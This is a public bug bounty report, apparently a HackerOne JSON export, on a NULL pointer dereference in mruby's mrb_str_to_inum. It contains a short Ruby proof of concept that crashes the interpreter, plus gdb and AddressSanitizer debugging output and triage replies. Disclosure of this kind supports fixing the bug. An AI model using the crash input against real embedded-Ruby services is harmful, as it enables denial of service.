{"id":217083,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTcwODM=","url":"https://hackerone.com/reports/217083","title":"SIGSEGV in mrb_str_inum","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-29T19:49:09.398Z","submitted_at":"2017-03-29T19:49:09.398Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-13T21:28:10.067Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-04-13T21:28:02.456Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_str_inum.rb):\n\n\tdef method_missing(*)false\n\tend\n\tdef to_str()\"\"end\n\tInteger(ÿ,2).h\n\nDebug - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb\n\tr Reading symbols from ./mirb...idone.\n\t(gdb) r test_mrb_str_inum.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_str_inum.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :method_missing\n\t =\u003e :to_str\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 '\\001') at /home/x/Desktop/test/mruby/src/string.c:2253\n\t2253\t  len = RSTRING_LEN(str);\n\t(gdb) info reg\n\trax            0x1\t1\n\trbx            0x6c3100\t7090432\n\trcx            0x7\t7\n\trdx            0x10\t16\n\trsi            0x6b01c0\t7012800\n\trdi            0x6b0010\t7012368\n\trbp            0x7fffffffc2c0\t0x7fffffffc2c0\n\trsp            0x7fffffffc290\t0x7fffffffc290\n\tr8             0x2\t2\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x41f81a\t0x41f81a \u003cmrb_str_to_inum+69\u003e\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t2248\t{\n\t2249\t  const char *s;\n\t2250\t  mrb_int len;\n\t2251\t\n\t2252\t  s = mrb_string_value_ptr(mrb, str);\n\t2253\t  len = RSTRING_LEN(str);\n\t2254\t  return mrb_str_len_to_inum(mrb, s, len, base, badcheck);\n\t2255\t}\n\t(gdb) x/x $rax\n\t0x1:\tCannot access memory at address 0x1\n\nBacktrace - mirb\n-------------------\n\n\t(gdb) bt\n\t#0  0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 '\\001') at /home/x/Desktop/test/mruby/src/string.c:2253\n\t#1  0x000000000042552c in mrb_convert_to_integer (mrb=0x6b0010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548\n\t#2  0x000000000046b2b5 in mrb_f_integer (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114\n\t#3  0x00000000004070bb in mrb_vm_exec (mrb=0x6b0010, proc=0x6b2230, pc=0x720660) at /home/x/Desktop/test/mruby/src/vm.c:1259\n\t#4  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b2230, self=..., stack_keep=1) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#5  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_str_inum.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e :method_missing\n\t =\u003e :to_str\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==8627==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x000000510b04 bp 0x7fff5fbbe7f0 sp 0x7fff5fbbe7b0 T0)\n\t\t#0 0x510b03 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9\n\t\t#1 0x51c50e in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14\n\t\t#2 0x56c26b in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10\n\t\t#3 0x4f77a3 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18\n\t\t#4 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#5 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#6 0x7f205f22fec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#7 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum\n\t==8627==ABORTING\n\nDebug - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby\n\tReading symbols from ./mruby...done.\n\t(gdb) r test_mrb_str_inum.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_str_inum.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 '\\001') at /home/x/Desktop/test/mruby/src/string.c:2253\n\t2253\t  len = RSTRING_LEN(str);\n\t(gdb) info reg\n\trax            0x1\t1\n\trbx            0x6c2100\t7086336\n\trcx            0x8\t8\n\trdx            0x10\t16\n\trsi            0x6af1c0\t7008704\n\trdi            0x6af010\t7008272\n\trbp            0x7fffffffd4c0\t0x7fffffffd4c0\n\trsp            0x7fffffffd490\t0x7fffffffd490\n\tr8             0x2\t2\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x40ff86\t0x40ff86 \u003cmrb_str_to_inum+69\u003e\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t2248\t{\n\t2249\t  const char *s;\n\t2250\t  mrb_int len;\n\t2251\t\n\t2252\t  s = mrb_string_value_ptr(mrb, str);\n\t2253\t  len = RSTRING_LEN(str);\n\t2254\t  return mrb_str_len_to_inum(mrb, s, len, base, badcheck);\n\t2255\t}\n\t2256\t\n\t2257\t/* 15.2.10.5.38 */\n\t(gdb) x/x $rax\n\t0x1:\tCannot access memory at address 0x1\n\nBacktrace - mruby\n-------------------\n\n\t(gdb) bt\n\t#0  0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 '\\001') at /home/x/Desktop/test/mruby/src/string.c:2253\n\t#1  0x0000000000415c98 in mrb_convert_to_integer (mrb=0x6af010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548\n\t#2  0x000000000046aa60 in mrb_f_integer (mrb=0x6af010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114\n\t#3  0x0000000000441e14 in mrb_vm_exec (mrb=0x6af010, proc=0x6b1320, pc=0x718d28) at /home/x/Desktop/test/mruby/src/vm.c:1259\n\t#4  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#5  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614\n\t#6  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cfa0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n\t#7  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cbe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n\t#8  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_str_inum.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==7540==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x0000004fffe4 bp 0x7fff8680ee40 sp 0x7fff8680ee00 T0)\n\t\t#0 0x4fffe3 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9\n\t\t#1 0x50b9ee in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14\n\t\t#2 0x56b9cb in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10\n\t\t#3 0x53cb33 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18\n\t\t#4 0x53af3e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#5 0x543a03 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12\n\t\t#6 0x52cbc0 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7\n\t\t#7 0x52cd92 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10\n\t\t#8 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11\n\t\t#9 0x7f033b21bec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#10 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum\n\t==7540==ABORTING\n\nSystem information\n-------------------\n\n\tSHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a\n\tLinux 14.04 x86_64\n\tgcc version 4.8.4\n\t","vulnerability_information_html":"\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as test_mrb_str_inum.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef method_missing(*)false\nend\ndef to_str()\u0026quot;\u0026quot;end\nInteger(ÿ,2).h\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mirb\"\u003eDebug - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb\nr Reading symbols from ./mirb...idone.\n(gdb) r test_mrb_str_inum.rb \nStarting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_str_inum.rb\nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :method_missing\n =\u0026gt; :to_str\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 \u0026#39;\\001\u0026#39;) at /home/x/Desktop/test/mruby/src/string.c:2253\n2253      len = RSTRING_LEN(str);\n(gdb) info reg\nrax            0x1  1\nrbx            0x6c3100 7090432\nrcx            0x7  7\nrdx            0x10 16\nrsi            0x6b01c0 7012800\nrdi            0x6b0010 7012368\nrbp            0x7fffffffc2c0   0x7fffffffc2c0\nrsp            0x7fffffffc290   0x7fffffffc290\nr8             0x2  2\nr9             0x0  0\nr10            0x0  0\nr11            0x7ffff7895770   140737346361200\nr12            0x401ca0 4201632\nr13            0x7fffffffdf30   140737488346928\nr14            0x0  0\nr15            0x0  0\nrip            0x41f81a 0x41f81a \u0026lt;mrb_str_to_inum+69\u0026gt;\neflags         0x10206  [ PF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n2248    {\n2249      const char *s;\n2250      mrb_int len;\n2251    \n2252      s = mrb_string_value_ptr(mrb, str);\n2253      len = RSTRING_LEN(str);\n2254      return mrb_str_len_to_inum(mrb, s, len, base, badcheck);\n2255    }\n(gdb) x/x $rax\n0x1:    Cannot access memory at address 0x1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mirb\"\u003eBacktrace - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x000000000041f81a in mrb_str_to_inum (mrb=0x6b0010, str=..., base=2, badcheck=1 \u0026#39;\\001\u0026#39;) at /home/x/Desktop/test/mruby/src/string.c:2253\n#1  0x000000000042552c in mrb_convert_to_integer (mrb=0x6b0010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548\n#2  0x000000000046b2b5 in mrb_f_integer (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114\n#3  0x00000000004070bb in mrb_vm_exec (mrb=0x6b0010, proc=0x6b2230, pc=0x720660) at /home/x/Desktop/test/mruby/src/vm.c:1259\n#4  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b2230, self=..., stack_keep=1) at /home/x/Desktop/test/mruby/src/vm.c:823\n#5  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mirb\"\u003eClang - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_str_inum.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; :method_missing\n =\u0026gt; :to_str\nASAN:DEADLYSIGNAL\n=================================================================\n==8627==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x000000510b04 bp 0x7fff5fbbe7f0 sp 0x7fff5fbbe7b0 T0)\n    #0 0x510b03 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9\n    #1 0x51c50e in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14\n    #2 0x56c26b in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10\n    #3 0x4f77a3 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18\n    #4 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n    #5 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n    #6 0x7f205f22fec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #7 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum\n==8627==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mruby\"\u003eDebug - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby\nReading symbols from ./mruby...done.\n(gdb) r test_mrb_str_inum.rb \nStarting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_str_inum.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 \u0026#39;\\001\u0026#39;) at /home/x/Desktop/test/mruby/src/string.c:2253\n2253      len = RSTRING_LEN(str);\n(gdb) info reg\nrax            0x1  1\nrbx            0x6c2100 7086336\nrcx            0x8  8\nrdx            0x10 16\nrsi            0x6af1c0 7008704\nrdi            0x6af010 7008272\nrbp            0x7fffffffd4c0   0x7fffffffd4c0\nrsp            0x7fffffffd490   0x7fffffffd490\nr8             0x2  2\nr9             0x0  0\nr10            0x0  0\nr11            0x7ffff7895770   140737346361200\nr12            0x401b20 4201248\nr13            0x7fffffffdf30   140737488346928\nr14            0x0  0\nr15            0x0  0\nrip            0x40ff86 0x40ff86 \u0026lt;mrb_str_to_inum+69\u0026gt;\neflags         0x10206  [ PF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n2248    {\n2249      const char *s;\n2250      mrb_int len;\n2251    \n2252      s = mrb_string_value_ptr(mrb, str);\n2253      len = RSTRING_LEN(str);\n2254      return mrb_str_len_to_inum(mrb, s, len, base, badcheck);\n2255    }\n2256    \n2257    /* 15.2.10.5.38 */\n(gdb) x/x $rax\n0x1:    Cannot access memory at address 0x1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mruby\"\u003eBacktrace - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x000000000040ff86 in mrb_str_to_inum (mrb=0x6af010, str=..., base=2, badcheck=1 \u0026#39;\\001\u0026#39;) at /home/x/Desktop/test/mruby/src/string.c:2253\n#1  0x0000000000415c98 in mrb_convert_to_integer (mrb=0x6af010, val=..., base=2) at /home/x/Desktop/test/mruby/src/object.c:548\n#2  0x000000000046aa60 in mrb_f_integer (mrb=0x6af010, self=...) at /home/x/Desktop/test/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114\n#3  0x0000000000441e14 in mrb_vm_exec (mrb=0x6af010, proc=0x6b1320, pc=0x718d28) at /home/x/Desktop/test/mruby/src/vm.c:1259\n#4  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823\n#5  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b1320, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614\n#6  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cfa0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n#7  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cbe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n#8  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mruby\"\u003eClang - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_str_inum.rb \nASAN:DEADLYSIGNAL\n=================================================================\n==7540==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x0000004fffe4 bp 0x7fff8680ee40 sp 0x7fff8680ee00 T0)\n    #0 0x4fffe3 in mrb_str_to_inum /home/x/Desktop/test/clang/mruby/src/string.c:2253:9\n    #1 0x50b9ee in mrb_convert_to_integer /home/x/Desktop/test/clang/mruby/src/object.c:548:14\n    #2 0x56b9cb in mrb_f_integer /home/x/Desktop/test/clang/mruby/mrbgems/mruby-kernel-ext/src/kernel.c:114:10\n    #3 0x53cb33 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1259:18\n    #4 0x53af3e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n    #5 0x543a03 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12\n    #6 0x52cbc0 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7\n    #7 0x52cd92 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10\n    #8 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11\n    #9 0x7f033b21bec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #10 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/string.c:2253:9 in mrb_str_to_inum\n==7540==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"system-information\"\u003eSystem information\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a\nLinux 14.04 x86_64\ngcc version 4.8.4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":51,"name":"NULL Pointer Dereference"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":172185,"file_name":"test_mrb_str_inum.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/172/185/f3d91cfecc232685b529b8db0c3c22c9287cd453/test_mrb_str_inum.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_str_inum.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_str_inum.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXUI3A3EU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045855Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF3FYvBYleEBKlcR4U813JIy2bW57CnBEMYNVUklmu%2F8AiEAkmkT5udE997pW9%2Brdr3EQcAl90OKeowQeNnY5PWn0FMqtAMIURABGgwwMTM2MTkyNzQ4NDkiDPawt2AQxXBDYjcx8SqRAxeHaKWteeUxrUqlkoufMMEA5gt7fGuPc%2FQ8XlAC6if7%2BAN3DuxhIczuGXyMD3AZ2gCh%2FbZPPmpgHCvQzYSuMsyxNOfy9tQQ9EROgfRZPXLMRN4%2FpGSWQ6gHtJdtsCmudNYzECf0IUxf6i1g4hXbPb8e6uzX6I5SZyEPqw%2FdP5dI%2B7b%2BDigifeXhq7w45BRg7OT6J5Hjnta4dbkMBMlp%2F0My8pTlWcFC%2FtnydbIhcmv1iJ8l95%2F9k94nFAe%2Ba9K%2FrHhmRp1vXXtcV%2BSQt6Rt%2Bu9YekgMLRnk0t7iG06rQosuJAYyNQ5VLHP0y7Er6mta9IsRvuhX6JEymQLINEVYOKl4jLRAGGtRfn3IK51oSd5rvwzW9bUUr3cyd%2BFYucpmBfuGecFvEV3om2Ix3tQasywRnnB62D3IHtj9H24%2FqVsVjkf0L%2F4%2FrQZzEGfgTaW36SNg%2FtrmWuqHdaU5MphbfdTO0b4QE1Pbvbabbhzj9jepApBj3PzTEDZ1kgeqfWrh2Y%2B9xqcsXMr0oBM4TwawREfeMPfnqf8FOusBlr0EVcM7s3rMsU4cJiAYmagVYoLJLjHWikxkoiN1XJ1GdOFn4TYDAV84a%2FYZUsjHIpo1bNZZb6ByP3ITgSDq61DodRCfnMKxgWrSPnBLf52FhVTepY72JjNLMG5brQjaYkRqUh04T73%2Fl%2Fiucs1oIBFG5Z2EGc36AkTTr9yU97IX104KaNmwKYu0EWIgdWFFzzEJwuPd5oFDLiKVdAk%2BAcyr9ckpYQNcGr22oQCogaF2%2FYE6z9TV8XI3hPksjavj%2Fsub6%2BtFMy%2Fv0CnmvZqSmN%2Be%2FmBVeEq4rFmi6qzkLBuzYAopi6n90EQDGg%3D%3D\u0026X-Amz-Signature=38e32fc0477236361c0a219ed2fc477764d720e0d7f5439a8850265d91cfdfaa","file_size":63,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-05-13T21:28:02.496Z","allow_singular_disclosure_after":-114507053.38524278,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","apapedulimu","spetr0x","pkhadka"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1571374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-29T19:49:09.674Z","updated_at":"2017-03-29T19:49:09.674Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1581762,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3581","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the crash and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3581\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3581\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3581\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T21:23:26.034Z","updated_at":"2017-04-03T21:23:26.034Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1603035,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. 